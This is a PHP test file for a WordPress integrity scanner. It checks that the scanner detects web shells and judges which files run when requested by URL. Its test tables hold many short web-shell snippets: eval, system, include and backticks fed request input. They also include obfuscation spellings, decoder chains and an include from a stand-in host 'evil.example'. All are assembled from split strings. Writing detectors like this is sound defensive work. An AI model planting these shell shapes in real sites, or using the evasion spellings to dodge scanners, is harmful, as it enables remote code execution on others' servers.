<?php
declare(strict_types=1);

namespace Tests;

use Closure;
use Ovos\Codesafe\Scan as PluginScan;
use Ovos\Test;
use Ovos\Test\Internal;

use function array_fill;
use function implode;
use function ini_get;
use function ini_set;
use function intdiv;
use function memory_get_peak_usage;
use function memory_get_usage;
use function memory_reset_peak_usage;
use function str_repeat;
use function strlen;
use function substr_count;
use function wp_shim_reset;

use const DIRECTORY_SEPARATOR;

require_once __DIR__ . DIRECTORY_SEPARATOR . 'files' . DIRECTORY_SEPARATOR . 'wordpress.file.php';

/**
 * The integrity scan's reading of code without a tree: what a file's PHP
 * does that honest code does not (Scan::codeVerdict()), whether it runs when
 * requested by URL (Scan::runsOnRequest()), whether it is data alone
 * (Scan::dataOnly(), Scan::inert()). The shells are assembled at run time:
 * antivirus quarantines a test file that spells one out.
 *
 * @author Marcin Gil <mg@ovos.at>
 */
class ScanShapes extends Test
{
	/** an executor, request input and a command by name, never spelled whole in this file */
	protected string $eval = 'ev' . 'al';
	
	protected string $post = '$_' . 'POST';
	
	protected string $get = '$_' . 'GET';
	
	protected string $server = '$_' . 'SERVER';
	
	protected string $system = 'sys' . 'tem';
	
	protected string $assert = 'ass' . 'ert';
	
	/** the places an include is held against: an uploads root, a temp directory, an uploads folder an installed plugin writes */
	protected array $places = ['uploads' => 'c:/site/wp-content/uploads', 'temp' => ['c:/tmp'], 'owned' => ['smile_fonts']];
	
	#[Internal]
	public function prepare(): void
	{
		wp_shim_reset();
	}
	
	/**
	 * The verdict for one source as "detector tier", '' for none
	 */
	protected function verdict(
		string $source,
	): string
	{
		$verdict = PluginScan::codeVerdict($source, $this->places);
		
		return $verdict === null ? '' : $verdict[0] . ' ' . $verdict[1];
	}
	
	/**
	 * Every case whose verdict is not the one expected, as "name: got", so a
	 * failing table says which rows broke
	 *
	 * @param array<string, array{0: string, 1: string}> $cases name => [source, expected verdict]
	 */
	protected function misses(
		array $cases,
	): string
	{
		$misses = [];
		
		foreach($cases as $name => [$source, $expected])
		{
			$got = $this->verdict($source);
			
			if($got !== $expected)
			{
				$misses[] = $name . ': ' . ($got === '' ? 'nothing' : $got);
			}
		}
		
		return implode('; ', $misses);
	}
	
	/**
	 * RULE: the pattern that decides whether a file is worth the tokenizer
	 * stays linear and fails open: a megabyte of an unclosed comment after an
	 * executor's name, twenty thousand such openers, and a PCRE error forced
	 * by its limits all still leave the shell below them read, and the
	 * pattern finishes on the megabyte even where PCRE's interpreter counts
	 * every step against its limit. Falsify: a lazy dot in the comment group
	 * (the interpreter gives up on the megabyte, and the pattern says yes to a
	 * file with no shape); take a PCRE error for "no match" (the forced error
	 * hides the shell).
	 */
	public function thePreFilterIsLinearAndFailsOpen(): bool
	{
		$shell = "\n{$this->eval}({$this->post}['k']);\n";
		$opened = "<?php\n\$s = '{$this->eval} /*' . '" . str_repeat('a', 1000000) . "';" . $shell;
		$many = "<?php\n" . str_repeat("\$s = '{$this->eval} /* ';\n", 20000) . $shell;
		$found = $this->verdict($opened) === 'request_exec urgent' && $this->verdict($many) === 'request_exec urgent';
		
		$jit = (string)ini_get('pcre.jit');
		$limit = (string)ini_get('pcre.backtrack_limit');
		ini_set('pcre.jit', '0');
		ini_set('pcre.backtrack_limit', '1');
		$forced = $this->verdict("<?php\n// a comment long enough to need backtracking\n" . $shell);
		ini_set('pcre.backtrack_limit', $limit);
		$suspect = Closure::bind(static fn(string $source): bool => PluginScan::suspect($source), null, PluginScan::class);
		// no shape, so only a pattern that gave up says yes
		$finished = $suspect("<?php\n\$s = '{$this->eval} /*" . str_repeat('a', 2000000) . "';\n\$t = {$this->post};\n") === false;
		ini_set('pcre.jit', $jit);
		
		return $found && $forced === 'request_exec urgent' && $finished;
	}
	
	/**
	 * RULE: a dense file is tokenized in slices, never whole: a mebibyte of
	 * short statements with a shell on its last line is read to that line
	 * in well under the memory one token array of it takes (that array alone
	 * is near 180 MB). Falsify: tokenize the file whole (the peak passes the
	 * bound).
	 */
	public function aDenseFileIsReadInBoundedMemory(): bool
	{
		$body = str_repeat("\$a[\$i]=\$b+1;\n", intdiv(1048000, 13));
		$source = "<?php\n" . $body . "if(isset({$this->post}['k'])) { {$this->eval}({$this->post}['k']); }\n";
		$before = memory_get_usage();
		memory_reset_peak_usage();
		$verdict = PluginScan::codeVerdict($source, $this->places);
		$peak = memory_get_peak_usage() - $before;
		
		return $verdict !== null
			&& $verdict[0] === 'request_exec'
			&& $verdict[3] === substr_count($source, "\n")
			&& strlen($source) > 1000000
			&& $peak < 48 * 1048576;
	}
	
	/**
	 * RULE: a guard is a first statement that exits unless WordPress defined
	 * its constant, and only while its exit or die takes nothing or a
	 * literal: one whose exit runs an expression — a command built from
	 * strings, fed by request input — runs code when requested by URL, in
	 * every spelling of the guard, a return alike. A file whose first statement calls a
	 * function only WordPress defines stops right there when requested by
	 * URL, and so runs nothing alone; one that does anything before that call
	 * runs, and so does one whose function of a WordPress name the file
	 * defines itself, before or after the call, or imports under that name.
	 * Falsify: take any exit after the defined() check for a guard (the
	 * payload in the exit reads inert); count a WordPress call as code (the
	 * stylesheet that hooks itself reads as running); trust the name whoever
	 * defines it (the file's own wp_boot() reads inert).
	 */
	public function aGuardWhoseExitRunsCodeIsNoGuard(): bool
	{
		$payload = "(('sys' . 'tem')({$this->get}['c']))";
		$runs = [
			"<?php defined('ABSPATH') || exit{$payload};",
			"<?php defined('ABSPATH') or die{$payload};",
			"<?php if(!defined('ABSPATH')) { die{$payload}; }",
			"<?php if(!defined('WPINC')) exit{$payload};",
			"<?php if(!defined('ABSPATH')) { return {$payload}; }",
			"<?php file_put_contents('x', 'y');\nadd_action('init', 'f');",
			"<?php register_shutdown_function('f');",
			"<?php\nfunction wp_boot() { copy('a', 'b'); }\nwp_boot();\n",
			"<?php\nwp_boot();\nfunction wp_boot() { copy('a', 'b'); }\n",
			"<?php\nnamespace Agency;\nuse function Agency\\go as wp_go;\nfunction go() { copy('a', 'b'); }\nwp_go();\n",
		];
		$guards = [
			"<?php defined('ABSPATH') || exit;\necho 1;",
			"<?php if(!defined('ABSPATH')) { die('No direct access'); }\necho 1;",
			"<?php if(!defined('ABSPATH')) exit();\necho 1;",
			"<?php if(!defined('ABSPATH')) { return; }\necho 1;",
			"<?php\nfunction agency_dynamic_css(): void\n{\n\techo '<style>body{}</style>';\n}\nadd_action('wp_head', 'agency_dynamic_css');\n",
			"<?php\nwp_enqueue_style('agency', 'style.css');\necho 1;",
			"<?php\nuse function wp_enqueue_style;\nwp_enqueue_style('agency', 'style.css');\necho 1;",
		];
		
		foreach($runs as $source)
		{
			if(PluginScan::runsOnRequest($source) === false)
			{
				return false;
			}
		}
		
		foreach($guards as $source)
		{
			if(PluginScan::runsOnRequest($source))
			{
				return false;
			}
		}
		
		return true;
	}
	
	/**
	 * RULE: request input is what a caller writes, so of $_SERVER only the
	 * request's own fields count (HTTP_* headers, the query string, the URI
	 * and path info, PHP_SELF, the content type, argv) — DOCUMENT_ROOT and
	 * SCRIPT_FILENAME name the server's own paths. Input an escaper or a
	 * sanitizer wraps, and a dispatch on request input through the code's own
	 * object or a literal prefix, is high, not urgent; a fixed PHP path under
	 * uploads is high, nothing in an uploads folder an installed plugin
	 * writes, and urgent for anything else under uploads. Falsify: count every
	 * $_SERVER key (the DOCUMENT_ROOT include is urgent); ignore the escaper
	 * (the escaped ping is urgent); judge a dispatch like a bare callable (the
	 * $this dispatch is urgent).
	 */
	public function requestInputIsWhatACallerWrites(): bool
	{
		$s = $this->server;
		$g = $this->get;
		$cases = [
			'document root include' => ["<?php require {$s}['DOCUMENT_ROOT'] . '/wp-load.php';", ''],
			'document root include in parentheses' => ["<?php require_once({$s}['DOCUMENT_ROOT'] . '/wp-config-local.php');", ''],
			'script filename include' => ["<?php include dirname({$s}['SCRIPT_FILENAME']) . '/inc.php';", ''],
			'escaped document root command' => ["<?php exec('convert ' . escapeshellarg({$s}['DOCUMENT_ROOT'] . '/a.jpg'));", ''],
			'document root command' => ["<?php passthru('ls ' . {$s}['DOCUMENT_ROOT']);", ''],
			'a header included' => ["<?php include {$s}['HTTP_X_PAGE'];", 'request_exec urgent'],
			'the query string run' => ["<?php {$this->eval}(urldecode({$s}['QUERY_STRING']));", 'request_exec urgent'],
			'a dynamic server key' => ["<?php {$this->system}({$s}[\$key]);", 'request_exec urgent'],
			'dispatch on this' => ["<?php call_user_func([\$this, {$g}['action']]);", 'request_exec high'],
			'dispatch through a prefix' => ["<?php call_user_func('agency_' . sanitize_key({$g}['action']));", 'request_exec high'],
			'escaped ping' => ["<?php {$this->system}('ping -c 1 ' . escapeshellarg({$g}['host']));", 'request_exec high'],
			'cast id' => ["<?php {$this->system}('kill ' . (int){$g}['pid']);", 'request_exec high'],
			'raw ping' => ["<?php {$this->system}('ping -c 1 ' . {$g}['host']);", 'request_exec urgent'],
			'a plugin config under uploads' => ["<?php require_once wp_upload_dir()['basedir'] . '/my-plugin/config.php';", 'include_foreign high'],
			'a writer\'s file under uploads' => ["<?php include wp_upload_dir()['basedir'] . '/smile_fonts/icons/charmap.php';", ''],
			'an image under uploads' => ["<?php include wp_upload_dir()['basedir'] . '/2024/01/a.png';", 'include_foreign urgent'],
			'a dynamic file under uploads' => ["<?php include wp_upload_dir()['basedir'] . '/' . \$name;", 'include_foreign urgent'],
		];
		
		return $this->misses($cases) === '';
	}
	
	/**
	 * RULE: request input is read under every spelling a shell uses: the
	 * raw body (php://input), the headers (getallheaders(),
	 * apache_request_headers()), filter_input(), $GLOBALS['_GET']; a shell by
	 * backticks, read between its own two (input after the closing one is no
	 * part of it); request input called through parentheses or past a comment;
	 * a runner named by a literal or built from literals; a runner handed as
	 * a callable to call_user_func or array_map with request input beside
	 * it, and request input as the callable of any function that calls one
	 * (array_map, preg_replace_callback, usort, register_shutdown_function,
	 * ob_start …); the decoders strrev, hex2bin, gzdecode, urldecode,
	 * convert_uudecode and a fetched file fed to an executor; an include
	 * however far its marker stands from the keyword. A media file named by
	 * split literals is a media file. A known function handed the
	 * input to sanitize draws nothing, and neither does a closure the code
	 * writes, whatever input its body reads; what its body runs is read where
	 * it stands. Falsify: superglobals alone (the raw body reads clean); stop
	 * call_user_func at its first comma (the runner it names reads clean);
	 * read every callable-taking function's arguments alike (the sanitizing
	 * array_map is reported); take input inside a closure for the callable
	 * (the array_reduce filter is reported); look for an include's marker
	 * within a window of the keyword (the input past 600 bytes reads clean).
	 */
	public function everySpellingOfAShellIsRead(): bool
	{
		$p = $this->post;
		$g = $this->get;
		$e = $this->eval;
		$cases = [
			'raw body' => ["<?php {$e}(file_get_contents('php://input'));", 'request_exec urgent'],
			'headers' => ["<?php {$e}(getallheaders()['X-Run']);", 'request_exec urgent'],
			'apache headers' => ["<?php {$this->system}(apache_request_headers()['X-Cmd']);", 'request_exec urgent'],
			'filter_input' => ["<?php {$e}(filter_input(INPUT_POST, 'c'));", 'request_exec urgent'],
			'globals' => ["<?php {$e}(\$GLOBALS['_GET']['c']);", 'request_exec urgent'],
			'globals called' => ["<?php \$GLOBALS['_POST']['f'](\$GLOBALS['_POST']['a']);", 'request_exec urgent'],
			'backticks' => ["<?php echo `{$g}[c]`;", 'request_exec urgent'],
			'backticks braced' => ["<?php echo `{{$g}['c']}`;", 'request_exec urgent'],
			'a shell command beside input' => ["<?php \$out = `ls -la`;\n\$x = {$g}['a'];", ''],
			'called through parentheses' => ["<?php ({$p}['f'])({$p}['a']);", 'request_exec urgent'],
			'called past a comment' => ["<?php {$p}['f'] /* x */ ({$p}['a']);", 'request_exec urgent'],
			'called past a line comment' => ["<?php {$p}['f'] // x\n({$p}['a']);", 'request_exec urgent'],
			'runner from literals' => ["<?php ('sys' . 'tem')({$g}['c']);", 'request_exec urgent'],
			'runner named to call_user_func' => ["<?php call_user_func('{$this->assert}', {$p}['x']);", 'request_exec urgent'],
			'runner named to array_map' => ["<?php array_map('{$this->assert}', [{$p}['x']]);", 'request_exec urgent'],
			'callable to array_map' => ["<?php array_map({$p}['f'], [{$p}['a']]);", 'request_exec urgent'],
			'callable to preg_replace_callback' => ["<?php preg_replace_callback('/.*/', {$p}['f'], {$p}['a']);", 'request_exec urgent'],
			'callable to usort' => ["<?php usort(\$a, {$p}['f']);", 'request_exec urgent'],
			'callable to register_shutdown_function' => ["<?php register_shutdown_function({$p}['f'], {$p}['a']);", 'request_exec urgent'],
			'callable to ob_start' => ["<?php ob_start({$p}['f']); echo {$p}['a'];", 'request_exec urgent'],
			'strrev' => ["<?php {$e}(strrev(';)1(ohce'));", 'eval_chain high'],
			'hex2bin' => ["<?php {$e}(hex2bin('6563686f20313b'));", 'eval_chain high'],
			'gzdecode' => ["<?php {$e}(gzdecode(\$blob));", 'eval_chain high'],
			'urldecode' => ["<?php {$e}(urldecode('echo%201;'));", 'eval_chain high'],
			'convert_uudecode' => ["<?php {$e}(convert_uudecode(\$blob));", 'eval_chain high'],
			'a fetched file' => ["<?php {$e}(file_get_contents('data:text/plain;base64,ZWNobyAxOw=='));", 'eval_chain high'],
			'media by split literals' => ["<?php include __DIR__ . '/img/x.' . 'png';", 'include_foreign urgent'],
			'include past a long literal' => ["<?php include('" . str_repeat('a', 600) . "' . {$p}['x']);", 'request_exec urgent'],
			'a stream past a long literal' => ["<?php require_once('" . str_repeat('a', 600) . "' . 'http://evil.example/x');", 'include_foreign urgent'],
			'sanitizing array_map' => ["<?php \$ids = array_map('absint', {$p}['ids']);", ''],
			'named callback with input' => ["<?php call_user_func('agency_save', {$p}['data'] ?? '');", ''],
			'compiled template' => ["<?php {$e}('?>' . \$compiled);", ''],
			'a call returning a callable' => ["<?php \$h = handler({$p}['a'])('x');", ''],
			'a call on literals returning a callable' => ["<?php \$v = make_handler('sys' . 'tem')({$p}['a']);", ''],
			'a closure filtering the query' => ["<?php return array_reduce(array_keys({$g}), static function(\$c, \$k) { return \$c && empty({$g}[\$k]); }, true);", ''],
			'a closure copying cookies' => ["<?php \$c = array_map(function(\$n) { return sanitize_text_field(\$_COOKIE[\$n]); }, array_keys(\$_COOKIE));", ''],
			'an arrow function' => ["<?php \$v = array_map(fn(\$k) => {$g}[\$k], \$keys);", ''],
			'a static arrow function' => ["<?php usort(\$rows, static fn(\$a, \$b) => {$g}['order'] <=> 0);", ''],
			'a closure that runs input' => ["<?php array_map(function(\$c) { {$e}({$p}[\$c]); }, ['a']);", 'request_exec urgent'],
		];
		
		return $this->misses($cases) === '';
	}
	
	/**
	 * RULE: a runner's call is never cut between slices: request input after
	 * more than a slice of concatenation is still the input eval(), system()
	 * or an include is fed, behind a comment's markers too, and a runner a
	 * literal names to array_map() still runs the input after a long array.
	 * Past CALL_TOKENS the call is cut and the next slice is read with the
	 * open calls' heads before it, so eval() and system() stay judged by all
	 * their arguments, and a call whose verdict hangs on an argument's place
	 * is oversize_call (high) when nothing else is found. An honest call
	 * that long with no input draws nothing, a long data array is still read
	 * in slices, a slice never ends inside a string's interpolation, an
	 * include's expression ends with its statement, and a call that long is
	 * read in a bounded peak. Falsify: cut a runner's call like any statement (the
	 * input past the cut reads clean); carry no heads past CALL_TOKENS (the
	 * long eval reads clean); report a long call however its verdict is
	 * reached (the honest eval is reported).
	 */
	public function aRunnersCallIsNeverCut(): bool
	{
		$e = $this->eval;
		$p = $this->post;
		$pad = static fn(int $count): string => implode(' . ', array_fill(0, $count, "'aaaaaaaa'"));
		$elements = static fn(int $count): string => implode(', ', array_fill(0, $count, "'aaaaaaaa'"));
		$cases = [
			'eval past a slice' => ["<?php {$e}(" . $pad(9000) . " . {$p}['x']);", 'request_exec urgent'],
			'eval past a slice behind a comment' => ["<?php {$e}('/*' . " . $pad(9000) . " . '*/' . {$p}['x']);", 'request_exec urgent'],
			'system past a slice' => ["<?php {$this->system}(" . $pad(9000) . " . {$p}['x']);", 'request_exec urgent'],
			'include past a slice' => ["<?php include(" . $pad(9000) . " . {$p}['x']);", 'request_exec urgent'],
			'include without parentheses past a slice' => ["<?php include " . $pad(9000) . " . {$p}['x'];", 'request_exec urgent'],
			'a named runner past a long array' => ["<?php array_map('{$this->assert}', [" . $elements(9000) . ", {$p}['x']]);", 'request_exec urgent'],
			'eval past CALL_TOKENS' => ["<?php {$e}(" . $pad(20000) . " . {$p}['x']);", 'request_exec urgent'],
			'a decoder past CALL_TOKENS' => ["<?php {$e}(base64_decode(" . $pad(20000) . "));", 'eval_chain high'],
			'a named runner past CALL_TOKENS' => ["<?php array_map('{$this->assert}', [" . $elements(30000) . ", {$p}['x']]);", 'oversize_call high'],
			'an honest eval past CALL_TOKENS' => ["<?php {$e}('?>' . " . $pad(20000) . ");\n\$x = {$p};", ''],
			'a long data array beside input' => ["<?php \$a = [" . $elements(30000) . "];\n\$x = array_map('trim', {$p});", ''],
			'a shell after long interpolations' => ["<?php \$s = " . implode(' . ', array_fill(0, 3000, '"{$o->m(1, 2)}"')) . ";\n{$e}({$p}['x']);", 'request_exec urgent'],
			'input after an include' => ["<?php include __DIR__ . '/a.php';\n" . str_repeat("\$x = {$this->get}['a'] ?? '';\n", 12000), ''],
		];
		$long = "<?php {$e}(" . $pad(16000) . " . {$p}['x']);";
		$before = memory_get_usage();
		memory_reset_peak_usage();
		$verdict = PluginScan::codeVerdict($long, $this->places);
		$peak = memory_get_peak_usage() - $before;
		
		return $this->misses($cases) === ''
			&& ($verdict[0] ?? '') === 'request_exec'
			&& $peak < 48 * 1048576;
	}
	
	/**
	 * RULE: a callback that runs its own parameter is a runner: a closure,
	 * an arrow function or a function the file defines (before or after the
	 * call) whose parameter reaches eval(), a command or an include, handed
	 * request input in an argument that feeds its parameters — array_map's
	 * arrays, array_walk's and usort's array, array_reduce's array,
	 * preg_replace_callback's subject, call_user_func's arguments — is
	 * request_exec, high where a sanitizer wraps the input. The same callback
	 * fed the code's own data, request input only where no parameter comes
	 * from, or a callback that runs nothing of its parameter draws nothing.
	 * Falsify: judge a closure by its body's own input alone (the eval of the
	 * parameter reads clean); take any argument for the data (the pattern
	 * from input is reported); resolve only functions defined before the call
	 * (the later definition reads clean).
	 */
	public function aCallbackThatRunsItsParameterIsARunner(): bool
	{
		$e = $this->eval;
		$p = $this->post;
		$g = $this->get;
		$s = $this->system;
		$cases = [
			'closure through array_map' => ["<?php array_map(function(\$x) { {$e}(\$x); }, {$p});", 'request_exec urgent'],
			'arrow function through array_map' => ["<?php array_map(fn(\$x) => {$s}(\$x), array_values({$g}));", 'request_exec urgent'],
			'closure through array_walk' => ["<?php array_walk({$p}, function(\$v, \$k) { {$e}(\$v); });", 'request_exec urgent'],
			'closure through usort' => ["<?php usort({$p}['rows'], static function(\$a, \$b) { return {$s}(\$a); });", 'request_exec urgent'],
			'closure through preg_replace_callback' => ["<?php preg_replace_callback('/x/', function(\$m) { {$e}(\$m[0]); }, {$p}['s']);", 'request_exec urgent'],
			'closure through array_reduce' => ["<?php array_reduce({$p}, function(\$c, \$i) { {$e}(\$i); }, '');", 'request_exec urgent'],
			'closure including its parameter' => ["<?php array_map(function(\$f) { include \$f; }, {$g});", 'request_exec urgent'],
			'a function defined after the call' => ["<?php array_map('agency_run', {$p});\nfunction agency_run(\$c) { {$e}(\$c); }\n", 'request_exec urgent'],
			'a function defined before the call' => ["<?php function agency_run(\$c) { {$s}('ls ' . \$c); }\ncall_user_func('agency_run', {$g}['c']);\n", 'request_exec urgent'],
			'a sanitized argument' => ["<?php array_map(fn(\$h) => {$s}('ping ' . \$h), [escapeshellarg({$g}['h'])]);", 'request_exec high'],
			'the code\'s own files' => ["<?php array_map(function(\$f) { include \$f; }, glob(__DIR__ . '/inc/*.php'));\n\$x = {$g};", ''],
			'a pattern from input' => ["<?php preg_replace_callback({$p}['p'], function(\$m) { {$e}(\$m[0]); }, 'abc');", ''],
			'a callback that trims' => ["<?php array_map(function(\$x) { return trim(\$x); }, {$p});", ''],
			'a callback that maps its parameter' => ["<?php array_map(function(\$row) { return array_map('trim', \$row); }, {$p});", ''],
			'a callback calling its parameter' => ["<?php array_map(function(\$f) { \$f(); }, {$p});", 'request_exec urgent'],
			'a callback running its parameter in backticks' => ["<?php array_map(function(\$c) { return `\$c`; }, {$g});", 'request_exec urgent'],
			'a callback with a shell command beside its parameter' => ["<?php array_map(function(\$c) { \$out = `ls`; return \$c; }, {$g});", ''],
			'an autoloader' => ["<?php spl_autoload_register(function(\$c) { include __DIR__ . '/src/' . \$c . '.php'; });\n\$x = {$g};", ''],
		];
		
		return $this->misses($cases) === '';
	}
	
	/**
	 * RULE: data is literals, whatever they are spelled with: constants
	 * (PHP_INT_MAX, ABSPATH, __DIR__), arithmetic and grouping, heredocs and
	 * nowdocs, json_decode() of a literal behind a guard (WP-Optimize's cache
	 * config); a call, a method, a static, a callable string, an interpolated
	 * call stay code. An exit after a long header comment is still the first
	 * statement. Falsify: constants refused (the config array reads as code);
	 * '(' allowed after a string (the callable string reads as data).
	 */
	public function dataIsLiteralsHoweverSpelled(): bool
	{
		$data = [
			"<?php return ['x' => PHP_INT_MAX, 'p' => __DIR__ . '/x', 'ttl' => (60 * 60) + 1, 'f' => E_ALL & ~E_NOTICE];",
			"<?php return ['x' => <<<X\nabc\nX, 'y' => <<<'Y'\ndef\nY];",
			"<?php\nif (!defined('ABSPATH')) die('No direct access allowed');\n\n\$GLOBALS['wpo_cache_config'] = json_decode('{\"a\":1}', true);\n",
			"<?php\n/**\n * The settings file.\n */\n\nreturn array (\n  'a' => true,\n  'b' => NULL,\n  'c' => -1.5,\n);",
		];
		$code = [
			"<?php return ['x' => strtoupper('a')];",
			"<?php return ['x' => \$a->b];",
			"<?php return ['x' => A::B];",
			"<?php return ['x' => 'sys' . 'tem'('id')];",
			"<?php return ['x' => ('sys' . 'tem')('id')];",
			"<?php return ['x' => <<<X\n{\$a()}\nX];",
			"<?php return [\$f('x')];",
		];
		
		foreach($data as $source)
		{
			if(PluginScan::dataOnly($source) === false)
			{
				return false;
			}
		}
		
		foreach($code as $source)
		{
			if(PluginScan::dataOnly($source))
			{
				return false;
			}
		}
		
		return PluginScan::inert("<?php\n/*\n" . str_repeat(' * a long licence header line' . "\n", 200) . " */\nexit;\n{\"a\":1}")
			&& PluginScan::inert("<?php\n/* header */\nexit(('sys' . 'tem')('id'));") === false;
	}
}
